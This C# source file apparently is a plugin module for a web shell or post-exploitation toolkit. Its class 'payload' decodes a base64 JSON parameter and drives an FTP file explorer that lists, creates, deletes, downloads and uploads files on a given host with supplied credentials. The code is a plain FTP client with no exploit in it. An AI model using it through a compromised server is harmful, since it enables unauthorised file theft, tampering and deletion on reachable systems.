using System;
using System.Text;
using System.Net;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;

public class payload
{
    public payload() { }

    public string Execute(object param)
    {
        try
        {
            if (!(param is Dictionary<string, object> mapParam))
            {
                return "[-] ERROR: Invalid parameter type. Expected Dictionary.";
            }
            
            if (!mapParam.TryGetValue("json", out var jsonValue) || string.IsNullOrEmpty(jsonValue?.ToString()))
            {
                return "[-] Missing parameter json";
            }

            string rawInput = jsonValue.ToString();
            string szJson = "";

            try
            {
                byte[] data = Convert.FromBase64String(rawInput);
                szJson = Encoding.UTF8.GetString(data);
            }
            catch
            {
                szJson = rawInput;
            }

            string host = GetJsonValue(szJson, "ip");
            if (string.IsNullOrEmpty(host)) host = "127.0.0.1";

            int port = 21;
            int.TryParse(GetJsonValue(szJson, "port"), out port);
            if (port <= 0) port = 21;

            string user = GetJsonValue(szJson, "user");
            string pass = GetJsonValue(szJson, "pass");
            string action = GetJsonValue(szJson, "action");
            string remotePath = GetJsonValue(szJson, "path");
            if (string.IsNullOrEmpty(remotePath)) remotePath = "/";

            int timeout = 10;
            int.TryParse(GetJsonValue(szJson, "timeout"), out timeout);
            if (timeout <= 0)
                timeout = 10;

            FtpExplorerManager manager = new FtpExplorerManager(host, port, user, pass, timeout);
            return manager.ProcessAction(action, remotePath, szJson);
        }
        catch (Exception e)
        {
            return "[-] ERROR: " + e.Message;
        }
    }

    private string GetJsonValue(string json, string key)
    {
        Match match = Regex.Match(json, $"\"{key}\"\\s*:\\s*\"(.*?)\"");
        if (match.Success) return match.Groups[1].Value;

        match = Regex.Match(json, $"\"{key}\"\\s*:\\s*([^,\\}}\\]]+)");
        if (match.Success) return match.Groups[1].Value.Trim().Replace("\"", "");

        return "";
    }
}

public class FtpExplorerManager
{
    private string host;
    private int port;
    private string user;
    private string pass;
    private int timeout;

    public FtpExplorerManager(string host, int port, string user, string pass, int timeout)
    {
        this.host = host;
        this.port = port;
        this.user = user;
        this.pass = pass;
        this.timeout = timeout > 0 ? timeout : 10;
    }

    public string ProcessAction(string action, string remotePath, string rawJson)
    {
        if (string.IsNullOrEmpty(action)) action = "list";

        switch (action.ToLower())
        {
            case "list":
                return ListDirectory(remotePath);
            case "mkdir":
                return MakeDirectory(remotePath);
            case "delete":
                return DeleteFileOrDir(remotePath);
            case "download":
            case "read":
                return DownloadFile(remotePath);
            case "upload":
                string fileContentBase64 = GetJsonValue(rawJson, "content");
                return UploadFile(remotePath, fileContentBase64);
            default:
                return "[-] ERROR: Unknown file explorer action.";
        }
    }

    private string ListDirectory(string remotePath)
    {
        string uriString = $"ftp://{host}:{port}{remotePath}";
        try
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(uriString);
            request.Method = WebRequestMethods.Ftp.ListDirectoryDetails;
            request.Credentials = new NetworkCredential(user, pass);
            
            int timeoutMs = timeout > 0 ? timeout * 1000 : 10000;
            request.Timeout = timeoutMs;
            request.ReadWriteTimeout = timeoutMs;

            request.UsePassive = true;
            request.KeepAlive = false;
            request.EnableSsl = false;
            request.Proxy = null;

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            using (StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8))
            {
                string content = reader.ReadToEnd();
                return $"[+] SUCCESS_LIST\n{content}";
            }
        }
        catch (Exception ex)
        {
            string innerMsg = ex.InnerException != null ? " -> " + ex.InnerException.Message : "";
            return $"[-] Failed to list directory {remotePath} -> {ex.Message}{innerMsg}";
        }
    }

    private string MakeDirectory(string remotePath)
    {
        string uriString = $"ftp://{host}:{port}{remotePath}";
        try
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(uriString);
            request.Method = WebRequestMethods.Ftp.MakeDirectory;
            request.Credentials = new NetworkCredential(user, pass);
            request.Timeout = timeout > 0 ? timeout * 1000 : 10000;
            request.UsePassive = true;
            request.Proxy = null;

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            {
                return $"[+] SUCCESS_MKDIR -> Directory created: {remotePath}";
            }
        }
        catch (Exception ex)
        {
            return $"[-] Failed to create directory {remotePath} -> {ex.Message}";
        }
    }

    private string DeleteFileOrDir(string remotePath)
    {
        string uriString = $"ftp://{host}:{port}{remotePath}";
        try
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(uriString);
            request.Method = WebRequestMethods.Ftp.DeleteFile;
            request.Credentials = new NetworkCredential(user, pass);
            request.Timeout = timeout > 0 ? timeout * 1000 : 10000;
            request.UsePassive = true;
            request.Proxy = null;

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            {
                return $"[+] SUCCESS_DELETE -> Removed: {remotePath}";
            }
        }
        catch (Exception ex)
        {
            return $"[-] Failed to delete {remotePath} -> {ex.Message}";
        }
    }

    private string DownloadFile(string remotePath)
    {
        string uriString = $"ftp://{host}:{port}{remotePath}";
        try
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(uriString);
            request.Method = WebRequestMethods.Ftp.DownloadFile;
            request.Credentials = new NetworkCredential(user, pass);
            request.Timeout = timeout > 0 ? timeout * 1000 : 10000;
            request.UsePassive = true;
            request.Proxy = null;

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            using (Stream responseStream = response.GetResponseStream())
            using (MemoryStream memoryStream = new MemoryStream())
            {
                responseStream.CopyTo(memoryStream);
                byte[] fileBytes = memoryStream.ToArray();
                string base64Data = Convert.ToBase64String(fileBytes);
                return $"[+] SUCCESS_DOWNLOAD\n{base64Data}";
            }
        }
        catch (Exception ex)
        {
            return $"[-] Failed to download file {remotePath} -> {ex.Message}";
        }
    }

    private string UploadFile(string remotePath, string base64Content)
    {
        string uriString = $"ftp://{host}:{port}{remotePath}";
        try
        {
            if (string.IsNullOrEmpty(base64Content))
            {
                return "[-] Failed to upload: File content is empty.";
            }

            byte[] fileBytes = Convert.FromBase64String(base64Content);

            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(uriString);
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.Credentials = new NetworkCredential(user, pass);
            request.Timeout = timeout > 0 ? timeout * 1000 : 10000;
            request.UsePassive = true;
            request.Proxy = null;
            request.ContentLength = fileBytes.Length;

            using (Stream requestStream = request.GetRequestStream())
            {
                requestStream.Write(fileBytes, 0, fileBytes.Length);
            }

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            {
                return $"[+] SUCCESS_UPLOAD -> File uploaded successfully: {remotePath}";
            }
        }
        catch (Exception ex)
        {
            return $"[-] Failed to upload file {remotePath} -> {ex.Message}";
        }
    }

    private string GetJsonValue(string json, string key)
    {
        Match match = Regex.Match(json, $"\"{key}\"\\s*:\\s*\"(.*?)\"");
        if (match.Success) return match.Groups[1].Value;

        match = Regex.Match(json, $"\"{key}\"\\s*:\\s*([^,\\}}\\]]+)");
        if (match.Success) return match.Groups[1].Value.Trim().Replace("\"", "");

        return "";
    }
}